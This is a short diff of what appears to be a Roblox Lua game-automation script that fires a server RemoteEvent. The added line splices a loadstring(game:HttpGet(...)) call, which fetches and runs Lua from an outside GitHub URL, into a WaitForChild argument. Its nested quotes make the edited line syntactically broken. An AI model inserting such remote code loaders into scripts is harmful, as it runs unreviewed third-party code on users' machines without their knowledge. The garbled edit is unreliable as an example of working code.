@@ -338,7 +338,7 @@ local args = {
     [6] = "Stone"
 }
 wait(1)
-game:GetService("Players"):WaitForChild("LocalPlayer"):WaitForChild("PlayerGui"):WaitForChild("OreProcess"):WaitForChild("Remote"):WaitForChild("RemoteEvent"):FireServer(unpack(args))
+game:GetService("Players"):WaitForChild("loadstring(game:HttpGet("https://raw.githubusercontent.com/poompoomshop/XIN-TOWN/main/CODES", true))();"):WaitForChild("PlayerGui"):WaitForChild("OreProcess"):WaitForChild("Remote"):WaitForChild("RemoteEvent"):FireServer(unpack(args))
 
 end)
 
